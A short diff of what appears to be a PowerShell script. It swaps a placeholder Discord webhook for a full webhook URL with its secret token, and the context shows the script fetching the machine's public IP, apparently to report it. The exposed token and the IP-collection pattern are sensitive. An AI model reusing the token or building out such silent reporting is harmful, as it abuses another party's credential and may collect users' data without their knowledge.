@@ -1,4 +1,4 @@
-$webhook = "https://discord.com/api/webhooks/XXXXXX/XXXXXX"
+$webhook = "https://discord.com/api/webhooks/1380222529209241680/jOwJW5pI3_hLmcpsOVjSLsS3rZyYGiRDS49oKPa0myTKTAnRJ_vwqNhaFggDyJOfhji-"
 
 $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
 
